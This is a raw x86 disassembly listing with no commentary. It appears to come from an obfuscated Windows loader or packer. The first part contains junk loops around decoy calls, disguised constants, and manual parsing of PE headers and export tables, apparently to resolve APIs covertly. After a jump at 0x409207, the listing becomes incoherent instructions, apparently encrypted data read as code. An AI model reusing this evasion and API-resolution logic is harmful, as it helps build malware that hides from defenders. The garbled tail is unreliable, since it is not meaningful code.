  4088de:	sub    edi,ebx
  4088e0:	or     edi,DWORD PTR [edi+ebx*1]
  4088e3:	mov    edi,edx
  4088e5:	and    DWORD PTR ds:0x429000,0x0
  4088ef:	jmp    0x408901
  4088f4:	mov    edx,DWORD PTR ds:0x429000
  4088fa:	inc    edx
  4088fb:	mov    DWORD PTR ds:0x429000,edx
  408901:	cmp    DWORD PTR ds:0x429000,0x1a
  408908:	jae    0x40895a
  40890e:	cmp    DWORD PTR ds:0x429000,0x7
  408915:	jne    0x40893b
  40891b:	push   DWORD PTR [ebp-0x1c]
  40891e:	push   0x85ec
  408923:	push   0x4f88
  408928:	push   DWORD PTR [ebp-0x10]
  40892b:	push   0x6e2c
  408930:	push   0x428000
  408935:	call   DWORD PTR ds:0x424038
  40893b:	cmp    DWORD PTR ds:0x429000,0x6
  408942:	jne    0x408955
  408948:	mov    edx,DWORD PTR ds:0x429000
  40894e:	inc    edx
  40894f:	mov    DWORD PTR ds:0x429000,edx
  408955:	jmp    0x4088f4
  40895a:	mov    edx,DWORD PTR [ebp+0x8]
  40895d:	adc    DWORD PTR ds:0x42a00c,0x42801c
  408967:	mov    ebx,eax
  408969:	mov    eax,0x8a29a123
  40896e:	xor    esi,esi
  408970:	xor    ebx,eax
  408972:	xor    edi,0x0
  408975:	and    DWORD PTR ds:0x429000,0x1a3f
  40897f:	add    edx,ecx
  408981:	adc    esi,0xffffffff
  408984:	xor    edx,eax
  408986:	xor    esi,0x0
  408989:	cmp    edx,ebx
  40898b:	jne    0x408999
  408991:	cmp    esi,edi
  408993:	je     0x4089c8
  408999:	mov    edx,DWORD PTR ds:0x421922
  40899f:	mov    edx,DWORD PTR [edx+0x1c0]
  4089a5:	mov    edx,DWORD PTR [edx]
  4089a7:	xor    esi,esi
  4089a9:	add    edx,ecx
  4089ab:	adc    esi,0xffffffff
  4089ae:	xor    edx,eax
  4089b0:	xor    esi,0x0
  4089b3:	cmp    edx,0x70941fd1
  4089b9:	jne    0x408a32
  4089bf:	cmp    esi,0xffffffff
  4089c2:	jne    0x408a32
  4089c8:	mov    edx,DWORD PTR ds:0x4219a6
  4089ce:	mov    esi,DWORD PTR ds:0x42199e
  4089d4:	xor    edx,esi
  4089d6:	mov    DWORD PTR ds:0x42199e,edx
  4089dc:	mov    edx,DWORD PTR [ebp+0xc]
  4089df:	mov    edx,DWORD PTR [edx]
  4089e1:	mov    edx,DWORD PTR [edx]
  4089e3:	mov    esi,DWORD PTR ds:0x42199e
  4089e9:	add    DWORD PTR [edx],esi
  4089eb:	mov    esi,DWORD PTR [ebp+0x8]
  4089ee:	mov    edx,DWORD PTR ds:0x42199e
  4089f4:	xor    esi,0x7510893
  4089fa:	add    esi,0x3272db
  408a00:	xor    ebx,ebx
  408a02:	add    esi,ecx
  408a04:	adc    ebx,0xffffffff
  408a07:	xor    edi,edi
  408a09:	xor    esi,eax
  408a0b:	xor    ebx,0x0
  408a0e:	add    edx,ecx
  408a10:	adc    edi,0xffffffff
  408a13:	xor    edx,eax
  408a15:	xor    edi,0x0
  408a18:	cmp    edx,esi
  408a1a:	jne    0x408a32
  408a20:	cmp    edi,ebx
  408a22:	jne    0x408a32
  408a28:	mov    eax,ds:0x42199e
  408a2d:	mov    ds:0x4219a6,eax
  408a32:	pop    edi
  408a33:	pop    esi
  408a34:	pop    ebx
  408a35:	pop    ebp
  408a36:	ret    0x8
  408a39:	push   ebp
  408a3a:	mov    ebp,esp
  408a3c:	push   ecx
  408a3d:	mov    eax,ds:0x42176e
  408a42:	mov    eax,DWORD PTR [eax]
  408a44:	add    DWORD PTR ds:0x42901c,eax
  408a4a:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  408a51:	mov    eax,DWORD PTR [ebp+0x8]
  408a54:	adc    DWORD PTR ds:0x42a010,0x6bac
  408a5e:	mov    al,BYTE PTR [eax]
  408a60:	xor    DWORD PTR ds:0x42b018,0x428020
  408a6a:	add    al,0xd
  408a6c:	sbb    DWORD PTR ds:0x428004,0x428008
  408a76:	xor    al,0x6f
  408a78:	mov    DWORD PTR ds:0x428004,0x2e21
  408a82:	cmp    al,0x35
  408a84:	mov    DWORD PTR ds:0x42a00c,0x23cb
  408a8e:	jne    0x408b4b
  408a94:	and    DWORD PTR ds:0x428024,0x429014
  408a9e:	mov    eax,DWORD PTR [ebp+0x8]
  408aa1:	dec    edx
  408aa2:	mov    ecx,DWORD PTR [ebp+0x8]
  408aa5:	and    edx,DWORD PTR ds:0x42b010
  408aab:	add    ecx,DWORD PTR [eax+0x3c]
  408aae:	mov    edx,0x7510893
  408ab3:	mov    DWORD PTR [ebp+0x8],ecx
  408ab6:	and    DWORD PTR ds:0x42c008,0x0
  408ac0:	jmp    0x408ad2
  408ac5:	mov    ecx,DWORD PTR ds:0x42c008
  408acb:	inc    ecx
  408acc:	mov    DWORD PTR ds:0x42c008,ecx
  408ad2:	cmp    DWORD PTR ds:0x42c008,0x18
  408ad9:	jae    0x408b1d
  408adf:	cmp    DWORD PTR ds:0x42c008,0x9
  408ae6:	jne    0x408afc
  408aec:	push   0x429014
  408af1:	push   0x5ace
  408af6:	call   DWORD PTR ds:0x42403c
  408afc:	cmp    DWORD PTR ds:0x42c008,0x8
  408b03:	jne    0x408b18
  408b09:	xor    ecx,ecx
  408b0b:	or     ecx,DWORD PTR ds:0x42c008
  408b11:	inc    ecx
  408b12:	mov    DWORD PTR ds:0x42c008,ecx
  408b18:	jmp    0x408ac5
  408b1d:	mov    eax,DWORD PTR [ebp-0x4]
  408b20:	xor    eax,edx
  408b22:	push   esi
  408b23:	mov    esi,DWORD PTR [ebp+0x8]
  408b26:	mov    ecx,0x3272db
  408b2b:	add    eax,ecx
  408b2d:	cmp    DWORD PTR [esi+0x54],eax
  408b30:	pop    esi
  408b31:	je     0x408b3f
  408b37:	mov    eax,DWORD PTR [ebp+0x8]
  408b3a:	jmp    0x408b58
  408b3f:	mov    eax,DWORD PTR [ebp-0x4]
  408b42:	xor    eax,edx
  408b44:	add    eax,ecx
  408b46:	jmp    0x408b58
  408b4b:	mov    eax,DWORD PTR [ebp-0x4]
  408b4e:	xor    eax,0x7510893
  408b53:	add    eax,0x3272db
  408b58:	leave  
  408b59:	ret    0x4
  408b5c:	push   ebp
  408b5d:	mov    ebp,esp
  408b5f:	sub    esp,0x18
  408b62:	and    DWORD PTR ds:0x42901c,0x0
  408b6c:	jmp    0x408b7e
  408b71:	mov    edx,DWORD PTR ds:0x42901c
  408b77:	inc    edx
  408b78:	mov    DWORD PTR ds:0x42901c,edx
  408b7e:	cmp    DWORD PTR ds:0x42901c,0x1a
  408b85:	jae    0x408bb7
  408b8b:	cmp    DWORD PTR ds:0x42901c,0x22
  408b92:	jne    0x408ba8
  408b98:	push   0x8447
  408b9d:	push   0x4235b4
  408ba2:	call   DWORD PTR ds:0x424040
  408ba8:	jmp    0x408b71
  408bad:	adc    DWORD PTR ds:0x42b010,0x42b00c
  408bb7:	mov    DWORD PTR [ebp-0x10],0xf89f85b6
  408bbe:	mov    ecx,DWORD PTR ds:0x42173a
  408bc4:	mov    ecx,DWORD PTR [ecx]
  408bc6:	and    DWORD PTR ds:0x42c01c,ecx
  408bcc:	lea    eax,[ebp+0x14]
  408bcf:	mov    DWORD PTR [ebp-0x4],eax
  408bd2:	push   esi
  408bd3:	and    DWORD PTR ds:0x428018,0x0
  408bdd:	jmp    0x408bef
  408be2:	mov    esi,DWORD PTR ds:0x428018
  408be8:	inc    esi
  408be9:	mov    DWORD PTR ds:0x428018,esi
  408bef:	cmp    DWORD PTR ds:0x428018,0x1a
  408bf6:	jae    0x408cc4
  408bfc:	cmp    DWORD PTR ds:0x428018,0x28
  408c03:	jne    0x408c14
  408c09:	push   0x4235cf
  408c0e:	call   DWORD PTR ds:0x424044
  408c14:	jmp    0x408be2
  408c19:	and    DWORD PTR ds:0x42c000,0x0
  408c23:	mov    edx,DWORD PTR ds:0x42c000
  408c29:	inc    edx
  408c2a:	mov    DWORD PTR ds:0x42c000,edx
  408c30:	cmp    DWORD PTR ds:0x42c000,0x20
  408c37:	jne    0x408c52
  408c3d:	push   0x1ea1
  408c42:	push   0x42b008
  408c47:	push   0x423692
  408c4c:	call   DWORD PTR ds:0x424048
  408c52:	cmp    DWORD PTR ds:0x42c000,0x11
  408c59:	jb     0x408c23
  408c5f:	and    DWORD PTR ds:0x42b004,0x0
  408c69:	mov    edx,DWORD PTR ds:0x42b004
  408c6f:	inc    edx
  408c70:	mov    DWORD PTR ds:0x42b004,edx
  408c76:	cmp    DWORD PTR ds:0x42b004,0xf
  408c7d:	jne    0x408c93
  408c83:	push   0x428004
  408c88:	push   0x7cc5
  408c8d:	call   DWORD PTR ds:0x424014
  408c93:	cmp    DWORD PTR ds:0x42b004,0xe
  408c9a:	jne    0x408cad
  408ca0:	mov    edx,DWORD PTR ds:0x42b004
  408ca6:	inc    edx
  408ca7:	mov    DWORD PTR ds:0x42b004,edx
  408cad:	cmp    DWORD PTR ds:0x42b004,0x1d
  408cb4:	jb     0x408c69
  408cba:	mov    DWORD PTR ds:0x428014,0x22a8
  408cc4:	mov    esi,0xf89c85b6
  408cc9:	and    DWORD PTR ds:0x428008,0x0
  408cd3:	mov    edx,DWORD PTR ds:0x428008
  408cd9:	inc    edx
  408cda:	mov    DWORD PTR ds:0x428008,edx
  408ce0:	cmp    DWORD PTR ds:0x428008,0x19
  408ce7:	jne    0x408d17
  408ced:	push   0x62e7
  408cf2:	push   0x428000
  408cf7:	push   0x75f3
  408cfc:	push   0x428000
  408d01:	push   DWORD PTR [ebp-0x24]
  408d04:	push   0x6458
  408d09:	push   DWORD PTR [ebp-0x14]
  408d0c:	push   0x5743
  408d11:	call   DWORD PTR ds:0x424018
  408d17:	cmp    DWORD PTR ds:0x428008,0x14
  408d1e:	jb     0x408cd3
  408d24:	xor    ecx,ecx
  408d26:	add    ecx,DWORD PTR ds:0x429008
  408d2c:	adc    DWORD PTR ds:0x42c00c,ecx
  408d32:	mov    DWORD PTR [ebp-0xc],esi
  408d35:	lea    eax,[ebp-0xc]
  408d38:	dec    ecx
  408d39:	mov    DWORD PTR [ebp-0x14],eax
  408d3c:	mov    eax,DWORD PTR [ebp-0xc]
  408d3f:	adc    ecx,0x29e6
  408d45:	mov    edx,DWORD PTR [ebp-0x14]
  408d48:	and    DWORD PTR ds:0x428018,0x0
  408d52:	mov    ecx,DWORD PTR ds:0x428018
  408d58:	inc    ecx
  408d59:	mov    DWORD PTR ds:0x428018,ecx
  408d5f:	cmp    DWORD PTR ds:0x428018,0xb
  408d66:	jne    0x408d77
  408d6c:	push   0x4faf
  408d71:	call   DWORD PTR ds:0x42401c
  408d77:	cmp    DWORD PTR ds:0x428018,0xa
  408d7e:	jne    0x408d91
  408d84:	mov    ecx,DWORD PTR ds:0x428018
  408d8a:	inc    ecx
  408d8b:	mov    DWORD PTR ds:0x428018,ecx
  408d91:	cmp    DWORD PTR ds:0x428018,0x1e
  408d98:	jb     0x408d52
  408d9e:	inc    ecx
  408d9f:	mov    ecx,0x7510893
  408da4:	neg    DWORD PTR ds:0x42a004
  408daa:	xor    eax,ecx
  408dac:	add    eax,0x3272db
  408db1:	and    DWORD PTR ds:0x42c010,0x2759
  408dbb:	mov    DWORD PTR [edx],eax
  408dbd:	mov    edx,DWORD PTR ds:0x421732
  408dc3:	mov    eax,ds:0x421742
  408dc8:	sub    edx,eax
  408dca:	and    edx,DWORD PTR [edx+eax*1]
  408dcd:	mov    eax,ds:0x42179a
  408dd2:	inc    DWORD PTR ds:0x42a01c
  408dd8:	mov    edx,DWORD PTR [ebp-0x4]
  408ddb:	and    DWORD PTR ds:0x42a018,0x7b9c
  408de5:	mov    eax,DWORD PTR [eax]
  408de7:	and    DWORD PTR ds:0x42c000,0x5f81
  408df1:	add    eax,DWORD PTR [edx]
  408df3:	movzx  edx,BYTE PTR ds:0x42a014
  408dfa:	or     DWORD PTR ds:0x42a01c,edx
  408e00:	push   edi
  408e01:	add    DWORD PTR ds:0x42a004,edx
  408e07:	mov    DWORD PTR [ebp-0x8],eax
  408e0a:	movzx  edx,WORD PTR ds:0x428004
  408e11:	sbb    DWORD PTR ds:0x42a01c,edx
  408e17:	mov    edi,DWORD PTR [ebp+0x8]
  408e1a:	and    DWORD PTR ds:0x42b01c,0x631e
  408e24:	mov    eax,ds:0x421922
  408e29:	mov    eax,DWORD PTR [eax+0x198]
  408e2f:	xor    edi,ecx
  408e31:	mov    DWORD PTR ds:0x428018,0x14
  408e3b:	cmp    DWORD PTR ds:0x428018,0x0
  408e42:	je     0x408e95
  408e48:	cmp    DWORD PTR ds:0x428018,0x3
  408e4f:	jne    0x408e63
  408e55:	push   DWORD PTR [ebp-0x28]
  408e58:	push   0x77dc
  408e5d:	call   DWORD PTR ds:0x424020
  408e63:	cmp    DWORD PTR ds:0x428018,0x4
  408e6a:	jne    0x408e7d
  408e70:	mov    edx,DWORD PTR ds:0x428018
  408e76:	dec    edx
  408e77:	mov    DWORD PTR ds:0x428018,edx
  408e7d:	mov    edx,DWORD PTR ds:0x428018
  408e83:	dec    edx
  408e84:	mov    DWORD PTR ds:0x428018,edx
  408e8a:	jmp    0x408e3b
  408e8f:	and    DWORD PTR ds:0x42c014,ecx
  408e95:	mov    edx,0x3272db
  408e9a:	sbb    DWORD PTR ds:0x429008,0x451c
  408ea4:	add    edi,edx
  408ea6:	mov    DWORD PTR ds:0x42a000,0x2432
  408eb0:	cmp    DWORD PTR [eax],edi
  408eb2:	je     0x408ebf
  408eb8:	mov    eax,DWORD PTR [eax]
  408eba:	jmp    0x409144
  408ebf:	mov    eax,DWORD PTR [ebp+0x18]
  408ec2:	cmp    eax,esi
  408ec4:	jne    0x408ede
  408eca:	mov    DWORD PTR ds:0x42a01c,0x2296
  408ed4:	push   0xf89c85b5
  408ed9:	jmp    0x409133
  408ede:	mov    esi,DWORD PTR [ebp+0x18]
  408ee1:	mov    eax,0x2f4e
  408ee6:	mov    eax,0xf89c85b4
  408eeb:	cmp    esi,eax
  408eed:	jne    0x409123
  408ef3:	sbb    esi,esi
  408ef5:	mov    eax,DWORD PTR [ebp+0x10]
  408ef8:	mov    esi,DWORD PTR ds:0x42c008
  408efe:	sbb    esi,DWORD PTR ds:0x42a008
  408f04:	mov    DWORD PTR ds:0x42c008,esi
  408f0a:	xor    eax,ecx
  408f0c:	mov    DWORD PTR ds:0x428000,0x1b
  408f16:	cmp    DWORD PTR ds:0x428000,0x0
  408f1d:	je     0x408f86
  408f23:	cmp    DWORD PTR ds:0x428000,0x4
  408f2a:	jne    0x408f5a
  408f30:	push   0x42a000
  408f35:	push   0x8ffd
  408f3a:	push   DWORD PTR [ebp-0x14]
  408f3d:	push   0x428014
  408f42:	push   0x2d9f
  408f47:	push   0x42370c
  408f4c:	push   0x4cf3
  408f51:	push   DWORD PTR [ebp-0x1c]
  408f54:	call   DWORD PTR ds:0x424024
  408f5a:	cmp    DWORD PTR ds:0x428000,0x5
  408f61:	jne    0x408f74
  408f67:	mov    esi,DWORD PTR ds:0x428000
  408f6d:	dec    esi
  408f6e:	mov    DWORD PTR ds:0x428000,esi
  408f74:	mov    esi,DWORD PTR ds:0x428000
  408f7a:	dec    esi
  408f7b:	mov    DWORD PTR ds:0x428000,esi
  408f81:	jmp    0x408f16
  408f86:	add    eax,edx
  408f88:	mov    DWORD PTR [ebp-0x18],eax
  408f8b:	mov    eax,DWORD PTR [ebp+0xc]
  408f8e:	mov    esi,DWORD PTR [ebp-0x8]
  408f91:	xor    eax,ecx
  408f93:	add    eax,edx
  408f95:	imul   eax,DWORD PTR [esi]
  408f98:	mov    esi,DWORD PTR [ebp+0x8]
  408f9b:	xor    esi,ecx
  408f9d:	add    esi,edx
  408f9f:	cmp    esi,eax
  408fa1:	mov    eax,DWORD PTR [ebp-0x4]
  408fa4:	push   ebx
  408fa5:	je     0x408fc4
  408fab:	mov    esi,DWORD PTR [ebp-0x18]
  408fae:	add    DWORD PTR [eax],esi
  408fb0:	mov    eax,DWORD PTR [ebp-0x4]
  408fb3:	mov    esi,DWORD PTR [ebp+0xc]
  408fb6:	xor    esi,ecx
  408fb8:	add    esi,edx
  408fba:	imul   esi,DWORD PTR [eax]
  408fbd:	mov    DWORD PTR [eax],esi
  408fbf:	jmp    0x408fc9
  408fc4:	mov    esi,DWORD PTR [ebp+0x14]
  408fc7:	xor    DWORD PTR [eax],esi
  408fc9:	mov    eax,DWORD PTR [ebp-0x4]
  408fcc:	mov    edi,DWORD PTR [ebp+0x10]
  408fcf:	xor    edi,ecx
  408fd1:	mov    esi,0xffcd8d25
  408fd6:	mov    ebx,esi
  408fd8:	sub    ebx,edi
  408fda:	add    DWORD PTR [eax],ebx
  408fdc:	mov    eax,DWORD PTR [ebp-0x4]
  408fdf:	mov    edi,DWORD PTR [ebp-0x8]
  408fe2:	add    edi,DWORD PTR [eax]
  408fe4:	mov    DWORD PTR [ebp-0x8],edi
  408fe7:	mov    eax,DWORD PTR [ebp+0xc]
  408fea:	mov    edi,DWORD PTR [ebp+0xc]
  408fed:	xor    edi,ecx
  408fef:	xor    eax,ecx
  408ff1:	lea    eax,[eax+edi*1+0x64e5b6]
  408ff8:	mov    edi,DWORD PTR [ebp+0xc]
  408ffb:	xor    edi,ecx
  408ffd:	add    edi,edx
  408fff:	imul   eax,edi
  409002:	mov    edi,DWORD PTR [ebp+0xc]
  409005:	xor    edi,ecx
  409007:	sub    edi,eax
  409009:	mov    eax,DWORD PTR [ebp-0x4]
  40900c:	add    edi,edx
  40900e:	cmp    DWORD PTR [eax],edi
  409010:	mov    eax,DWORD PTR [ebp-0x4]
  409013:	mov    edi,DWORD PTR [ebp+0x10]
  409016:	jg     0x409029
  40901c:	xor    edi,ecx
  40901e:	mov    ebx,esi
  409020:	sub    ebx,edi
  409022:	add    DWORD PTR [eax],ebx
  409024:	jmp    0x40902f
  409029:	xor    edi,ecx
  40902b:	add    edi,edx
  40902d:	add    DWORD PTR [eax],edi
  40902f:	mov    eax,DWORD PTR [ebp-0x8]
  409032:	mov    edi,DWORD PTR [ebp-0x10]
  409035:	mov    eax,DWORD PTR [eax]
  409037:	xor    edi,ecx
  409039:	add    edi,0x3272da
  40903f:	not    edi
  409041:	and    eax,edi
  409043:	movsx  di,BYTE PTR [eax+0x1]
  409048:	mov    ebx,0x3b4b
  40904d:	sub    di,bx
  409050:	mov    ebx,0x8a85
  409055:	xor    di,bx
  409058:	mov    ebx,0x4f8a
  40905d:	cmp    di,bx
  409060:	jne    0x409088
  409066:	movsx  di,BYTE PTR [eax]
  40906a:	mov    ebx,0x3b4b
  40906f:	sub    di,bx
  409072:	mov    ebx,0x8a85
  409077:	xor    di,bx
  40907a:	mov    ebx,0x4f87
  40907f:	cmp    di,bx
  409082:	je     0x409098
  409088:	mov    edi,DWORD PTR [ebp-0x10]
  40908b:	xor    edi,ecx
  40908d:	mov    ebx,esi
  40908f:	sub    ebx,edi
  409091:	add    eax,ebx
  409093:	jmp    0x409043
  409098:	mov    esi,DWORD PTR [ebp-0x14]
  40909b:	mov    esi,DWORD PTR [esi]
  40909d:	mov    edi,DWORD PTR [eax+0x3c]
  4090a0:	lea    esi,[edi+esi*8+0x78]
  4090a4:	mov    esi,DWORD PTR [esi+eax*1]
  4090a7:	mov    DWORD PTR [ebp-0x8],esi
  4090aa:	mov    esi,DWORD PTR [ebp+0x8]
  4090ad:	xor    esi,ecx
  4090af:	add    esi,edx
  4090b1:	mov    DWORD PTR [ebp-0x14],esi
  4090b4:	mov    esi,DWORD PTR [ebp+0x8]
  4090b7:	mov    edi,DWORD PTR [ebp-0x8]
  4090ba:	xor    esi,ecx
  4090bc:	add    esi,edx
  4090be:	pop    ebx
  4090bf:	cmp    edi,esi
  4090c1:	jne    0x4090df
  4090c7:	mov    eax,DWORD PTR [ebp+0xc]
  4090ca:	xor    eax,ecx
  4090cc:	mov    ecx,DWORD PTR [ebp-0x8]
  4090cf:	add    eax,edx
  4090d1:	imul   eax,ecx
  4090d4:	mov    DWORD PTR [ebp-0x8],eax
  4090d7:	push   DWORD PTR [ebp+0x18]
  4090da:	jmp    0x409133
  4090df:	mov    ecx,DWORD PTR [ebp-0x8]
  4090e2:	add    ecx,eax
  4090e4:	mov    DWORD PTR [ebp-0x14],ecx
  4090e7:	mov    ecx,DWORD PTR [ebp-0x14]
  4090ea:	mov    ecx,DWORD PTR [ecx+0xc]
  4090ed:	movsx  cx,BYTE PTR [ecx+eax*1]
  4090f2:	mov    edx,0x3b4b
  4090f7:	sub    cx,dx
  4090fa:	mov    edx,0x8a85
  4090ff:	xor    cx,dx
  409102:	mov    edx,0x4f85
  409107:	cmp    cx,dx
  40910a:	jne    0x4090d7
  409110:	mov    ecx,DWORD PTR ds:0x421922
  409116:	mov    ecx,DWORD PTR [ecx+0x198]
  40911c:	mov    DWORD PTR [ecx],eax
  40911e:	jmp    0x409144
  409123:	mov    ecx,DWORD PTR [ebp+0x18]
  409126:	cmp    ecx,0xf89c85b5
  40912c:	jne    0x409144
  409132:	push   eax
  409133:	push   DWORD PTR [ebp+0x14]
  409136:	push   DWORD PTR [ebp+0x10]
  409139:	push   DWORD PTR [ebp+0xc]
  40913c:	push   DWORD PTR [ebp+0x8]
  40913f:	call   0x408b5c
  409144:	pop    edi
  409145:	pop    esi
  409146:	leave  
  409147:	ret    0x14
  40914a:	push   ebp
  40914b:	mov    ebp,esp
  40914d:	push   ecx
  40914e:	mov    DWORD PTR [ebp-0x4],0xf89c85ba
  409155:	mov    eax,DWORD PTR [ebp-0x4]
  409158:	mov    ecx,DWORD PTR ds:0x42b010
  40915e:	sbb    DWORD PTR ds:0x42a018,ecx
  409164:	mov    edx,DWORD PTR [ebp+0x10]
  409167:	mov    DWORD PTR ds:0x42801c,0x4950
  409171:	mov    ecx,0x7510893
  409176:	sbb    DWORD PTR ds:0x428028,0x4a48
  409180:	xor    eax,ecx
  409182:	add    DWORD PTR ds:0x42b000,0x42800c
  40918c:	add    eax,0x3272db
  409191:	mov    DWORD PTR ds:0x42a014,0x169
  40919b:	mov    DWORD PTR [edx],eax
  40919d:	sbb    eax,edx
  40919f:	mov    eax,DWORD PTR [ebp+0xc]
  4091a2:	xor    eax,ecx
  4091a4:	inc    edx
  4091a5:	push   esi
  4091a6:	xor    esi,edx
  4091a8:	mov    esi,DWORD PTR [ebp+0x10]
  4091ab:	mov    edx,0x3272db
  4091b0:	add    eax,edx
  4091b2:	add    DWORD PTR ds:0x42b01c,0x428020
  4091bc:	mov    DWORD PTR [esi+0x4],eax
  4091bf:	mov    eax,DWORD PTR [ebp+0x14]
  4091c2:	mov    esi,DWORD PTR ds:0x428024
  4091c8:	sbb    esi,DWORD PTR ds:0x429010
  4091ce:	mov    DWORD PTR ds:0x428024,esi
  4091d4:	mov    esi,DWORD PTR [ebp+0x10]
  4091d7:	mov    DWORD PTR [esi+0x8],eax
  4091da:	mov    eax,DWORD PTR [ebp+0x18]
  4091dd:	mov    esi,DWORD PTR [ebp+0x10]
  4091e0:	mov    DWORD PTR [esi+0xc],eax
  4091e3:	mov    eax,DWORD PTR [ebp+0x1c]
  4091e6:	mov    esi,DWORD PTR [ebp+0x10]
  4091e9:	mov    DWORD PTR [esi+0x10],eax
  4091ec:	mov    eax,DWORD PTR [ebp+0x8]
  4091ef:	xor    eax,ecx
  4091f1:	add    eax,edx
  4091f3:	pop    esi
  4091f4:	leave  
  4091f5:	ret    0x18
  4091f8:	push   ebp
  4091f9:	mov    ebp,esp
  4091fb:	sub    esp,0x94
  409201:	mov    eax,DWORD PTR [ebp+0x8]
  409204:	push   ebx
  409205:	neg    ecx
  409207:	jmp    0x40b57c
  40920c:	mov    dl,0xcf
  40920e:	enter  0x872f,0x27
  409212:	imul   ebp,DWORD PTR [edi+0x65],0x55d7ebdc
  409219:	fwait
  40921a:	and    al,dh
  40921c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40921d:	sbb    BYTE PTR [edx+0x62],ah
  409220:	or     bl,BYTE PTR [edi+0x62]
  409223:	bound  ebp,QWORD PTR [esi+0x1d]
  409226:	iret   
  409227:	push   esi
  409228:	jl     0x4092a5
  40922a:	das    
  40922b:	mov    ch,0xf
  40922d:	xchg   ebp,eax
  40922e:	and    ebx,esi
  409230:	xlat   BYTE PTR ds:[ebx]
  409231:	dec    edx
  409232:	in     al,dx
  409233:	sub    BYTE PTR [ebx+edi*8-0x42edde93],dl
  40923a:	ds addr16 mov eax,0x76026fb4
  409241:	test   DWORD PTR [edi-0x3e6dac83],0x992679e6
  40924b:	and    eax,0x5b3102e4
  409250:	and    edi,DWORD PTR [eax+0x452ef04f]
  409256:	test   al,0x8b
  409258:	test   ch,ah
  40925a:	cli    
  40925b:	lods   eax,DWORD PTR ds:[esi]
  40925c:	lds    eax,FWORD PTR [edx-0x737c910b]
  409262:	inc    ecx
  409263:	fiadd  WORD PTR [ebp+ecx*2-0x369b3ee7]
  40926a:	mov    eax,0xff827f82
  40926f:	push   esi
  409270:	lds    ebx,FWORD PTR [edx]
  409272:	push   ebp
  409273:	mov    edx,edx
  409275:	inc    ecx
  409276:	inc    ecx
  409277:	sbb    eax,0xa5d9b351
  40927c:	mov    eax,0x98213aac
  409281:	cli    
  409282:	outs   dx,DWORD PTR ds:[esi]
  409283:	ds jo  0x40920d
  409286:	xchg   ecx,eax
  409287:	or     ecx,DWORD PTR ds:0xdb235a51
  40928d:	cli    
  40928e:	jo     0x4092f5
  409290:	mov    DWORD PTR [eax],0xbebba4f7
  409296:	adc    al,0x9e
  409298:	adc    bh,BYTE PTR [esi]
  40929a:	neg    DWORD PTR [eax]
  40929c:	xchg   esp,eax
  40929d:	mov    edx,0xd857be96
  4092a2:	int    0xbf
  4092a4:	mov    bl,0xa8
  4092a6:	mov    ecx,0xe8a5540b
  4092ab:	imul   esi,DWORD PTR ds:0x810e079,0xf299eafd
  4092b5:	int3   
  4092b6:	and    BYTE PTR [ecx+eax*8-0x43165168],ah
  4092bd:	jge    0x4092ef
  4092bf:	fmul   st(1),st
  4092c1:	cs dec ecx
  4092c3:	mov    BYTE PTR [ecx-0x1c],dl
  4092c6:	push   ebx
  4092c7:	pusha  
  4092c8:	push   ecx
  4092c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4092ca:	add    al,0x86
  4092cc:	call   DWORD PTR [eax-0x6f]
  4092cf:	cdq    
  4092d0:	mov    ebx,0x3b2c3d57
  4092d5:	push   esp
  4092d6:	push   eax
  4092d7:	sar    BYTE PTR [edx],cl
  4092d9:	test   eax,0x6875b107
  4092de:	loope  0x40929b
  4092e0:	or     edi,DWORD PTR [ebp+edi*2+0xbfa3b1c]
  4092e7:	and    eax,0x4c2ec0a7
  4092ec:	cli    
  4092ed:	or     al,0x10
  4092ef:	adc    bh,BYTE PTR [ebx]
  4092f1:	xchg   edx,eax
  4092f2:	call   0x8ad8:0xc003832b
  4092f9:	fsubr  DWORD PTR [ebx]
  4092fb:	nop
  4092fc:	fld    QWORD PTR [ebx+0x76]
  4092ff:	sahf   
  409300:	cwde   
  409301:	test   BYTE PTR [eax],bl
  409303:	push   ebx
  409304:	scas   eax,DWORD PTR es:[edi]
  409305:	mov    WORD PTR [ebx],ds
  409307:	jle    0x409309
  409309:	xchg   ebx,eax
  40930a:	lahf   
  40930b:	pop    esp
  40930c:	or     bh,BYTE PTR [ecx+0x449c698f]
  409312:	push   ecx
  409313:	pop    ds
  409314:	sbb    ebx,DWORD PTR [ecx+esi*4-0x3c]
  409318:	sub    al,0x8b
  40931a:	mov    bl,0x73
  40931c:	fcmovb st,st(0)
  40931e:	in     eax,0xcb
  409320:	out    0xc2,al
  409322:	call   0xd95a:0x5851c3b3
  409329:	mov    DWORD PTR [esi+0x2e],0xf093a56f
  409330:	or     edi,DWORD PTR [ecx+ebp*1-0x1993c85]
  409337:	sub    BYTE PTR [ebx-0x42df4d35],0x45
  40933e:	iret   
  40933f:	pop    ss
  409340:	mov    esi,0x9565673f
  409345:	leave  
  409346:	nop
  409347:	xchg   edx,eax
  409348:	xchg   ecx,eax
  409349:	test   eax,0x428abfac
  40934e:	sub    al,0xda
  409350:	fild   WORD PTR [ecx+0x34907909]
  409356:	ins    BYTE PTR es:[edi],dx
  409357:	gs pusha 
  409359:	(bad)  
  40935a:	std    
  40935b:	push   0x29
  40935d:	in     al,0xf
  40935f:	in     eax,0x77
  409361:	mov    edx,0x709d3509
  409366:	lock ret 
  409368:	js     0x4093b9
  40936a:	sbb    DWORD PTR [edx-0x1d0724fd],esi
  409370:	call   0x7d05:0x37b59b1e
  409377:	push   cs
  409378:	loope  0x409334
  40937a:	in     eax,0x2
  40937c:	inc    ebp
  40937d:	cmp    BYTE PTR [ebp-0x12],al
  409380:	adc    al,0x94
  409382:	out    dx,al
  409383:	ficom  WORD PTR [eax+0x41257313]
  409389:	aaa    
  40938a:	test   al,0xcc
  40938c:	inc    esp
  40938d:	jle    0x4093f0
  40938f:	data16 ins BYTE PTR es:[edi],dx
  409391:	ror    BYTE PTR [ebx+0x0],0x4c
  409395:	jbe    0x409367
  409397:	cli    
  409398:	push   ebx
  409399:	dec    ebp
  40939a:	xchg   ebp,eax
  40939b:	lods   al,BYTE PTR ds:[esi]
  40939c:	pop    esp
  40939d:	popa   
  40939e:	and    eax,0xa0463b05
  4093a3:	cs or  eax,0x842877b7
  4093a9:	test   bl,bl
  4093ab:	dec    edi
  4093ac:	inc    ecx
  4093ad:	sbb    eax,0xb325d72b
  4093b2:	cmp    BYTE PTR [ecx],ah
  4093b4:	push   cs
  4093b5:	sahf   
  4093b6:	inc    ecx
  4093b7:	lods   al,BYTE PTR ds:[esi]
  4093b8:	dec    ebx
  4093b9:	xchg   ebx,eax
